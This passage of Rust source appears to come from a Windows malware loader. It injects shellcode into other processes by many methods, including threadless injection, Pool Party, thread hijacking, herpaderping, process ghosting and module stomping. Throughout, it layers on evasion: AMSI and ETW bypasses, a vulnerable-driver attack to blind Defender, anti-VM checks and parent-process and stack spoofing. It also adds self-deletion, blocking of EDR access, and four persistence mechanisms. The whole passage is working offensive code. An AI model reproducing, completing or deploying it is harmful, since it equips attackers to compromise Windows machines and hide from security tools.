        // FASE 4-03a: Threadless via NtDrawText hole
        if cfg.use_threadless {
            if let Some(pid) = effective_pid {
                #[inline(never)]
                fn threadless(pid: u32, sc: &[u8]) -> bool {
                    let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                    unsafe { inject_threadless_remote(pid, sc) }
                }
                injected = threadless(pid, &payload);
            }
        }

        // FASE 4-03b ALT: Pool Party (TpWorkerFactory) — si headless o ±2GB constraint
        if !injected {
            if let Some(pid) = effective_pid {
                #[inline(never)]
                fn pool_party(pid: u32, sc: &[u8]) -> bool {
                    let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                    crate::pool_party::pool_party_inject(pid, sc).is_ok()
                }
                injected = pool_party(pid, &payload);
            }
        }

        // FASE 4-03c ALT2: WaitingThread Hijacking (enhanced or legacy)
        if !injected {
            if let Some(pid) = effective_pid {
                let wt_result = if cfg.waiting_thread {
                    // Enhanced: WAIT-state-aware thread selection
                    let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                    unsafe { crate::waiting_thread::inject(pid, &payload) }
                } else {
                    // Legacy: first-thread-found hijacking
                    let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                    unsafe { waiting_thread_inject(pid, &payload) }
                };
                if let Err(e) = wt_result {
                    cleanup_handles(h_target_proc, h_target_thread);
                    return Err(e);
                }
                injected = true;
            }
        }

        // Fallback local: Function Stomping (sin proceso remoto)
        if !injected {
            #[inline(never)]
            fn stomp(sc: &[u8], dll: &str, exp: &str) -> Result<()> {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                unsafe {
                    crate::func_stomp::stomp_execute_restore(dll, exp, sc)
                        .with_context(|| format!("func_stomp {}!{}", dll, exp))?;
                }
                Ok(())
            }
            if let Err(e) = stomp(&payload, &cfg.stomp_dll, &cfg.stomp_export) {
                cleanup_handles(h_target_proc, h_target_thread);
                return Err(e);
            }
        }
    }

    // Resume target thread if we created it suspended
    if let Some(ht) = h_target_thread {
        unsafe {
            let mut prev: u32 = 0;
            // Bug 8/12: handle resume and close
            let _ = crate::recycled::nt_resume_thread(ht, &mut prev);
            crate::recycled::nt_close(ht);
        }
    }
    // Bug 12: Close process handle — must clear Option to prevent use-after-close
    if let Some(hp) = h_target_proc.take() {
        unsafe { crate::recycled::nt_close(hp); }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 5-01: SecureZeroMemory del payload buffer
    // ═══════════════════════════════════════════════════════════════════════
    crate::crypto::secure_zero_memory(&mut payload);
    drop(payload);

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 5-02: Self-Deletion ADS
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.self_delete {
        let _ = crate::self_delete::delete_self();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 5-03: BlockHandle SDDL en proceso target
    // Bloquea OpenProcess externo (Process Hacker, pe-sieve, EDR).
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.block_handle {
        if let Some(hp) = h_target_proc {
            let _ = crate::block_handle::block_external_handles(hp);
        } else if let Some(pid) = effective_pid {
            unsafe {
                // NtOpenProcess via RecycledGate — use 0x7A (specific access, not PROCESS_ALL_ACCESS)
                let mut hp: usize = 0;
                let mut cid = [pid as usize, 0usize]; // CLIENT_ID { UniqueProcess, UniqueThread }
                let mut oa: [usize; 6] = std::mem::zeroed(); // OBJECT_ATTRIBUTES (zeroed)
                oa[0] = std::mem::size_of::<[usize; 6]>(); // Length
                let st = crate::recycled::nt_open_process(
                    &mut hp, 0x7A, // PROCESS_SET_INFORMATION + extras for SDDL
                    oa.as_mut_ptr() as *mut std::ffi::c_void,
                    cid.as_mut_ptr() as *mut std::ffi::c_void,
                );
                if st == 0 && hp != 0 {
                    let _ = crate::block_handle::block_external_handles(hp);
                    crate::recycled::nt_close(hp);
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 5-04: PE Header Stomping (propio dropper)
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.stomp_own_header {
        unsafe {
            let own_base = get_own_image_base();
            if !own_base.is_null() {
                let _ = crate::stomp::stomp_mapped_region(own_base);
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 5-05: Ekko Sleep Obfuscation
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.sleep_ms > 0 {
        crate::sleep::ekko_sleep_dynamic(cfg.sleep_ms);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 5-06: PEB Module Unlinking (3 listas)
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.peb_unlink {
        let _ = crate::peb_unlink::unlink_self();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 6: Persistencia (4 mecanismos + resilience logic)
    // P1: COM Hijack HKCU → P2: NTFS EA → P3: Scheduled Task → P4: TLS CB
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.persist {
        let persist_cfg = cfg.persist_cfg.unwrap_or_default();
        let _results = crate::persist::install_all(&persist_cfg);
        // Start resilience monitor thread (30-min check loop)
        crate::persist::start_resilience_monitor(persist_cfg);
    }

    Ok(())
}

// ── Helper: load DLL into target process ────────────────────────────────────

pub fn load_dll_into_target(h_proc: usize, dll_path: &str) -> Result<usize> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    unsafe {
        let path = format!("\\??\\{}", dll_path);
        let wide: Vec<u16> = OsStr::new(&path).encode_wide().chain(Some(0)).collect();
        let byte_len = (wide.len() - 1) * 2;

        let mut us = winapi::shared::ntdef::UNICODE_STRING {
            Length:        byte_len as u16,
            MaximumLength: byte_len as u16 + 2,
            Buffer:        wide.as_ptr() as *mut u16,
        };
        let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        winapi::shared::ntdef::InitializeObjectAttributes(&mut oa, &mut us, 0x40, null_mut(), null_mut());

        let mut h_file: usize = 0;
        let mut iosb: IO_STATUS_BLOCK = std::mem::zeroed();
        let st = crate::recycled::invoke(crate::resolve::compute_hash("NtOpenFile"), 6, &[
            &mut h_file as *mut usize as usize,
            0x80100080usize,
            &mut oa as *mut _ as usize,
            &mut iosb as *mut _ as usize,
            0x7usize,
            0x20usize,
        ]);
        if st != 0 || h_file == 0 { return Err(anyhow!("NtOpenFile({}) failed", dll_path)); }

        let mut h_sect: usize = 0;
        let st = crate::recycled::nt_create_section(&mut h_sect, 0xF001F, null_mut(), null_mut() as *mut u64, 0x02, 0x1000000, h_file);
        crate::recycled::nt_close(h_file);
        if st != 0 { return Err(anyhow!("NtCreateSection(SEC_IMAGE) failed")); }

        let mut base: *mut std::ffi::c_void = null_mut();
        let mut sz: usize = 0;
        let st = crate::recycled::nt_map_view_of_section(h_sect, h_proc, &mut base, 0, 0, null_mut(), &mut sz, 1, 0, 0x02);
        crate::recycled::nt_close(h_sect);
        if st != 0 { return Err(anyhow!("NtMapViewOfSection(target) failed")); }

        Ok(base as usize)
    }
}

// ── Threadless injection ──────────────────────────────────────────────────────

pub unsafe fn inject_threadless_remote(target_pid: u32, shellcode: &[u8]) -> bool {
    use windows::Win32::Foundation::HANDLE as WinHandle;

    // NtOpenProcess via RecycledGate — 0x7A access (VM_OPERATION+VM_WRITE+VM_READ+QUERY_INFORMATION+CREATE_THREAD)
    let mut h: usize = 0;
    let mut cid = [target_pid as usize, 0usize];
    let mut oa: [usize; 6] = std::mem::zeroed();
    oa[0] = std::mem::size_of::<[usize; 6]>();
    let st = crate::recycled::nt_open_process(
        &mut h, 0x7A,
        oa.as_mut_ptr() as *mut std::ffi::c_void,
        cid.as_mut_ptr() as *mut std::ffi::c_void,
    );
    if st != 0 || h == 0 { return false; }
    let h_win = WinHandle(h as _);
    let result = crate::threadless::try_threadless_inject(h_win, "ntdll.dll", "NtClose", shellcode);
    crate::recycled::nt_close(h);
    result
}

// ── WaitingThread Hijacking ───────────────────────────────────────────────────

pub unsafe fn waiting_thread_inject(target_pid: u32, shellcode: &[u8]) -> Result<()> {
    use winapi::um::tlhelp32::*;
    use winapi::um::processthreadsapi::OpenThread;
    use winapi::shared::minwindef::FALSE;
    use winapi::um::winnt::{THREAD_ALL_ACCESS, CONTEXT_FULL};

    // NtOpenProcess via RecycledGate (no Win32 OpenProcess, no PROCESS_ALL_ACCESS)
    let mut h_proc_u: usize = 0;
    {
        let mut cid = [target_pid as usize, 0usize];
        let mut oa: [usize; 6] = std::mem::zeroed();
        oa[0] = std::mem::size_of::<[usize; 6]>();
        let st = crate::recycled::nt_open_process(
            &mut h_proc_u, 0x7A,
            oa.as_mut_ptr() as *mut std::ffi::c_void,
            cid.as_mut_ptr() as *mut std::ffi::c_void,
        );
        if st != 0 || h_proc_u == 0 {
            return Err(anyhow!("WaitingThread: NtOpenProcess({}) failed: 0x{:x}", target_pid, st as u32));
        }
    }

    // CreateToolhelp32Snapshot + OpenThread are irreducible (not syscalls)
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE {
        crate::recycled::nt_close(h_proc_u);
        return Err(anyhow!("WaitingThread: snapshot failed"));
    }

    let mut te: THREADENTRY32 = std::mem::zeroed();
    te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
    let mut h_thread: winapi::um::winnt::HANDLE = null_mut();

    if Thread32First(snap, &mut te) != 0 {
        loop {
            if te.th32OwnerProcessID == target_pid {
                let ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if !ht.is_null() { h_thread = ht; break; }
            }
            te = std::mem::zeroed();
            te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
            if Thread32Next(snap, &mut te) == 0 { break; }
        }
    }
    crate::recycled::nt_close(snap as usize);

    if h_thread.is_null() {
        crate::recycled::nt_close(h_proc_u);
        return Err(anyhow!("WaitingThread: no thread found in PID {}", target_pid));
    }
    let h_thread_u = h_thread as usize;

    // Mapping Injection
    let sc_size = shellcode.len();
    let mut max_size: u64 = sc_size as u64;
    let mut h_sect: usize = 0;
    let st = crate::recycled::nt_create_section(&mut h_sect, 0xF001F, null_mut(), &mut max_size, 0x04, 0x8000000, 0);
    if st != 0 {
        crate::recycled::nt_close(h_thread_u);
        crate::recycled::nt_close(h_proc_u);
        return Err(anyhow!("WaitingThread: NtCreateSection failed: 0x{:x}", st as u32));
    }

    let mut local: *mut std::ffi::c_void = null_mut();
    let mut local_sz: usize = 0;
    let st_local = crate::recycled::nt_map_view_of_section(h_sect, (-1isize) as usize, &mut local, 0, 0, null_mut(), &mut local_sz, 1, 0, 0x04);

    if st_local != 0 || local.is_null() {
        crate::recycled::nt_close(h_sect);
        crate::recycled::nt_close(h_thread_u);
        crate::recycled::nt_close(h_proc_u);
        return Err(anyhow!("WaitingThread: local map failed: 0x{:x}", st_local as u32));
    }

    if local_sz < sc_size {
        crate::recycled::nt_unmap_view_of_section((-1isize) as usize, local);
        crate::recycled::nt_close(h_sect);
        crate::recycled::nt_close(h_thread_u);
        crate::recycled::nt_close(h_proc_u);
        return Err(anyhow!("WaitingThread: local map size too small: {} < {}", local_sz, sc_size));
    }

    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local as *mut u8, sc_size);
    crate::recycled::nt_unmap_view_of_section((-1isize) as usize, local);

    let mut remote: *mut std::ffi::c_void = null_mut();
    let mut remote_sz: usize = 0;
    let st = crate::recycled::nt_map_view_of_section(h_sect, h_proc_u, &mut remote, 0, 0, null_mut(), &mut remote_sz, 1, 0, 0x20);
    crate::recycled::nt_close(h_sect);

    if st != 0 {
        crate::recycled::nt_close(h_thread_u);
        crate::recycled::nt_close(h_proc_u);
        return Err(anyhow!("WaitingThread: remote map failed: 0x{:x}", st as u32));
    }

    let mut prev: u32 = 0;
    let st_susp = crate::recycled::nt_suspend_thread(h_thread_u, &mut prev);
    if st_susp != 0 {
        crate::recycled::nt_close(h_thread_u);
        crate::recycled::nt_close(h_proc_u);
        return Err(anyhow!("WaitingThread: NtSuspendThread failed: 0x{:x}", st_susp as u32));
    }

    let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL;
    if crate::recycled::nt_get_context_thread(h_thread_u, &mut ctx as *mut winapi::um::winnt::CONTEXT as *mut std::ffi::c_void) == 0 {
        ctx.Rip = remote as u64;
        crate::recycled::nt_set_context_thread(h_thread_u, &mut ctx as *mut winapi::um::winnt::CONTEXT as *mut std::ffi::c_void);
    }
    crate::recycled::nt_resume_thread(h_thread_u, &mut prev);

    crate::recycled::nt_close(h_thread_u);
    crate::recycled::nt_close(h_proc_u);
    Ok(())
}

// ── Own image base ────────────────────────────────────────────────────────────

unsafe fn get_own_image_base() -> *mut u8 {
    #[cfg(target_arch = "x86_64")]
    {
        let peb: usize;
        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, readonly, pure));
        if peb == 0 { return null_mut(); }
        *(peb as *const *mut u8).add(2)
    }
    #[cfg(not(target_arch = "x86_64"))]
    { null_mut() }
}

// ── Embedded payload helpers ──────────────────────────────────────────────────

/// Versión de `run` que recibe el shellcode ya descifrado (skip download/decrypt).
/// Usada para payloads embebidos en compile-time vía payload_cfg.
pub fn run_with_shellcode(cfg: ChainConfig, shellcode: Vec<u8>) -> anyhow::Result<()> {
    // ═══ FASE 1: Anti-VM, Hammering, AMSI-HBP, Page Guard, Block-DLL, IAT Camo ═══
    if cfg.anti_vm  { crate::anti_vm::run_anti_vm(); }
    if cfg.hammer_seed != 0 {
        crate::hammering::hammer(cfg.hammer_seed, cfg.hammer_iters, cfg.hammer_min_secs);
    }
    crate::amsi_hbp::install_amsi_hbp();
    if cfg.amsi_page_guard {
        let _ = crate::amsi_page_guard::install_amsi_page_guard();
    }
    if crate::payload_cfg::BLOCK_DLL {
        unsafe { let _ = crate::policy::apply_block_dll_policy(); }
    }
    if cfg.iat_camo_profile > 0 {
        crate::iat_camo::apply_camouflage(cfg.iat_camo_profile as usize);
    }

    // ═══ CASCADE RESOLVER + Phantom Stubs + VEH/Hells Gate ═════════════
    { let _ = crate::syscall_map::syscall_map(); }
    crate::phantom::build_phantom_stubs();
    if cfg.veh_syscalls { unsafe { let _ = crate::veh_gate::initialize(); } }
    if cfg.hells_gate { unsafe { let _ = crate::hells_gate::resolve_all(); } }

    // ═══ PRE-FASE 3: BYOVD — blind EDR sensors ══════════════════════
    if cfg.byovd_enabled && !cfg.byovd_driver.is_empty() {
        let _ = unsafe {
            crate::byovd::run_byovd(&cfg.byovd_driver, &["MsMpEng.exe", "msmpeng.exe"])
        };
    }

    if cfg.patch_etw { unsafe { let _ = crate::etw::muffle_etw(); } }

    // ═══ FASE 3: PPID Spoof + Process Creation + Arg Spoof + Overload ═══
    let tier_a_active = !matches!(cfg.injection_method,
        InjectionMethod::Auto | InjectionMethod::KiStepOver | InjectionMethod::MappingInject);

    let (h_target_proc, h_target_thread) = if !tier_a_active
        && cfg.target_pid.is_none() && cfg.ppid_parent.is_some()
    {
        let parent_pid = match cfg.ppid_parent.unwrap() {
            0 => crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0),
            p => p,
        };
        if cfg.nt_create_process {
            let image = r"C:\Windows\System32\svchost.exe";
            match unsafe { crate::nt_create_process::create_suspended(
                image, Some(parent_pid), crate::payload_cfg::BLOCK_DLL,
            ) } {
                Ok((hp, ht, _pid)) => (Some(hp), Some(ht)),
                Err(_) => (None, None),
            }
        } else {
            let nethost = r"C:\Windows\System32\svchost.exe";
            match crate::ppid::spawn_with_ppid_spoof(nethost, parent_pid, true) {
                Ok((hp, ht)) => (Some(hp as usize), Some(ht as usize)),
                Err(_) => (None, None),
            }
        }
    } else {
        (None, None)
    };

    // RecycledGate handle cleanup (no Win32 CloseHandle)
    let cleanup_handles = |hp: Option<usize>, ht: Option<usize>| {
        unsafe {
            if let Some(h) = hp { crate::recycled::nt_close(h); }
            if let Some(h) = ht { crate::recycled::nt_close(h); }
        }
    };

    if let Some(hp) = h_target_proc {
        if !cfg.real_args.is_empty() {
            if let Err(e) = crate::arg_spoof::spoof_args_in_peb(hp, &cfg.real_args) {
                cleanup_handles(h_target_proc, h_target_thread);
                return Err(e);
            }
        }
    }

    if let (Some(hp), Some(ref dll_path)) = (h_target_proc, &cfg.overload_target_dll) {
        if let Err(e) = load_dll_into_target(hp, dll_path) {
            cleanup_handles(h_target_proc, h_target_thread);
            return Err(e);
        }
    }

    // ═══ FASE 4: INJECTION ════════════════════════════════════════
    let effective_pid = cfg.target_pid
        .or_else(|| h_target_proc.map(|hp| unsafe {
            // NtQueryInformationProcess → PID (no Win32 GetProcessId)
            #[repr(C)]
            struct PBI { _pad: [usize; 4], unique_pid: usize, _inh: usize }
            let mut pbi: PBI = std::mem::zeroed();
            let mut ret_len: u32 = 0;
            let st = crate::recycled::nt_query_information_process(
                hp, 0, &mut pbi as *mut PBI as *mut u8,
                std::mem::size_of::<PBI>() as u32, &mut ret_len,
            );
            if st == 0 { pbi.unique_pid as u32 } else { 0u32 }
        }))
        .filter(|&pid| pid != 0);

    let mut payload = shellcode;

    // ── Tsukuyomi dispatch (run_with_shellcode path) ────────────────
    // Each Tier A technique:
    //  1. Captures the injected PID from Ok(pid)
    //  2. Passes it as injected_pid to goto_cleanup (NOT effective_pid)
    //  3. Differentiates success/failure for block_handle and persist
    match cfg.injection_method {
        InjectionMethod::Auto => { /* fall through to default chain */ }

        InjectionMethod::EarlyBird => {
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::early_bird::early_bird_inject(&cfg.injection_target_exe, &payload) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("EarlyBird: {}", e));
                }
            }
        }
        InjectionMethod::EarlyBirdPpid => {
            let parent = match cfg.ppid_parent.unwrap_or(0) {
                0 => crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0), p => p,
            };
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::early_bird::early_bird_with_ppid(&cfg.injection_target_exe, &payload, parent) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("EarlyBird+PPID: {}", e));
                }
            }
        }
        InjectionMethod::Hypnosis => {
            let target = if cfg.injection_target_exe.is_empty() {
                r"C:\Windows\System32\notepad.exe"
            } else { &cfg.injection_target_exe };
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::hypnosis::hypnotize_and_inject(target, &payload) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("Hypnosis: {}", e));
                }
            }
        }
        InjectionMethod::DirtyVanity => {
            // DirtyVanity ALWAYS reflects off explorer.exe — never the PPID-spoofed
            // svchost, which is a fresh empty process with no interesting address space.
            let explorer_pid = crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0);
            if explorer_pid == 0 {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("DirtyVanity: cannot find explorer.exe for reflection"));
            }
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::dirty_vanity::reflect_and_inject(explorer_pid, &payload) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("DirtyVanity: {}", e));
                }
            }
        }
        InjectionMethod::Herpaderping => {
            if payload.len() < 2 || payload[0] != 0x4D || payload[1] != 0x5A {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("Herpaderping requires PE payload (MZ header)"));
            }
            // Load a real PE as decoy (notepad.exe). An empty decoy leaves a 0-byte
            // file on disk which is immediately suspicious to EDR heuristics.
            let decoy_bytes: Vec<u8>;
            let decoy: &[u8] = match &cfg.herpaderp_decoy {
                Some(d) if !d.is_empty() => d.as_slice(),
                _ => {
                    decoy_bytes = std::fs::read(r"C:\Windows\System32\notepad.exe")
                        .unwrap_or_default();
                    &decoy_bytes
                }
            };
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::herpaderping::herpaderp(&payload, decoy, None) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("Herpaderping: {}", e));
                }
            }
        }
        InjectionMethod::ModuleStomp => {
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            // ModuleStomp returns Result<(), String> — no PID (in-process technique)
            match crate::module_stomp::stomp_and_execute(&payload, None) {
                Ok(()) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("ModuleStomp: {}", e));
                }
            }
        }
        InjectionMethod::ProxyDll => {
            if cfg.injection_target_exe.is_empty() {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("ProxyDll requires --inject-target-exe"));
            }
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            // ProxyDll returns Result<usize, String> — handle, not PID
            match crate::proxy_dll::proxy_load_chained(&cfg.injection_target_exe) {
                Ok(_handle) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("ProxyDll: {}", e));
                }
            }
        }
        InjectionMethod::PoolParty => {
            let pid = effective_pid.unwrap_or(0);
            if pid == 0 {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("PoolParty: no target PID"));
            }
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::pool_party::pool_party_inject(pid, &payload) {
                Ok(_) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("PoolParty: {}", e));
                }
            }
        }
        InjectionMethod::Overload => {
            let dll = cfg.overload_target_dll.as_deref()
                .unwrap_or(r"C:\Windows\System32\version.dll");
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::overload::Module::new(payload.to_vec(), String::new(), dll.to_string()) {
                Ok(m) => match m.run() {
                    Ok(_) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, None, true);
                        return Ok(());
                    }
                    Err(e) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, None, false);
                        return Err(anyhow!("Overload run: {}", e));
                    }
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("Overload init: {}", e));
                }
            }
        }
        InjectionMethod::Phantom => {
            let ghostmask = crate::payload_cfg::GHOST_MASQUERADE;
            let ppid = cfg.ppid_parent.unwrap_or(0);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::ghost::spawn_ghosted(&payload, ghostmask, ppid) {
                Ok(()) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("Phantom/Ghost: {}", e));
                }
            }
        }
        InjectionMethod::KiStepOver => {
            let _ = crate::ki_step_over::install_step_over(&[
                "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtProtectVirtualMemory",
                "NtCreateThreadEx", "NtMapViewOfSection", "NtCreateSection",
            ]);
            // Fall through to default chain below
        }

        InjectionMethod::EarlyCascade => {
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            let parent = cfg.ppid_parent.map(|p| if p == 0 {
                crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0)
            } else { p }).unwrap_or(0);
            let result = if parent > 0 {
                unsafe { crate::early_cascade::cascade_inject_ppid(
                    &cfg.injection_target_exe, &payload, parent) }
            } else {
                unsafe { crate::early_cascade::cascade_inject(
                    &cfg.injection_target_exe, &payload) }
            };
            match result {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("EarlyCascade: {}", e));
                }
            }
        }

        InjectionMethod::MappingInject => {
            if let Some(pid) = effective_pid {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                match unsafe { crate::mapping_inject::mapping_inject(pid, &payload) } {
                    Ok(_base) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, effective_pid, true);
                        return Ok(());
                    }
                    Err(e) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, None, false);
                        return Err(anyhow!("MappingInject: {}", e));
                    }
                }
            } else {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("MappingInject: no target PID available"));
            }
        }

        InjectionMethod::WaitingThreadHijack => {
            if let Some(pid) = effective_pid {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                match unsafe { crate::waiting_thread::inject(pid, &payload) } {
                    Ok(()) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, effective_pid, true);
                        return Ok(());
                    }
                    Err(e) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, None, false);
                        return Err(anyhow!("WaitingThreadHijack: {}", e));
                    }
                }
            } else {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("WaitingThreadHijack: no target PID available"));
            }
        }

        InjectionMethod::NtCreateProcess => {
            let parent = cfg.ppid_parent.map(|p| if p == 0 {
                crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0)
            } else { p }).unwrap_or(0);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match unsafe { crate::nt_create_process::create_and_inject(
                &cfg.injection_target_exe, &payload, Some(parent),
            ) } {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("NtCreateProcess: {}", e));
                }
            }
        }

        InjectionMethod::ReflectivePe => {
            if payload.len() < 2 || payload[0] != 0x4D || payload[1] != 0x5A {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("ReflectivePe requires PE payload (MZ header)"));
            }
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match unsafe { crate::pe_loader::PE::run(payload.clone()) } {
                Ok(()) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("ReflectivePe: {}", e));
                }
            }
        }
    }

    let is_pe = payload.len() > 2 && payload[0] == 0x4D && payload[1] == 0x5A;

    if is_pe {
        // ── PE payload: Reflective PE → Process Ghosting → Module Overloading ──
        if cfg.reflective_pe {
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            if let Err(e) = unsafe { crate::pe_loader::PE::run(payload.clone()) } {
                cleanup_handles(h_target_proc, h_target_thread);
                return Err(anyhow!("Reflective PE: {}", e));
            }
        } else {
        let size_mb = payload.len() / (1024 * 1024);
        let ghostmask = crate::payload_cfg::GHOST_MASQUERADE;
        let ppid_for_ghost = cfg.ppid_parent.unwrap_or(0);

        let result = if size_mb >= 35 {
            #[inline(never)]
            fn inject_ghost(payload: &[u8], mask: &str, ppid: u32) -> Result<()> {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                unsafe { crate::ghost::spawn_ghosted(payload, mask, ppid) }
            }
            inject_ghost(&payload, ghostmask, ppid_for_ghost)
        } else {
            let dll = cfg.overload_target_dll.as_deref()
                .unwrap_or(r"C:\Windows\System32\version.dll");
            #[inline(never)]
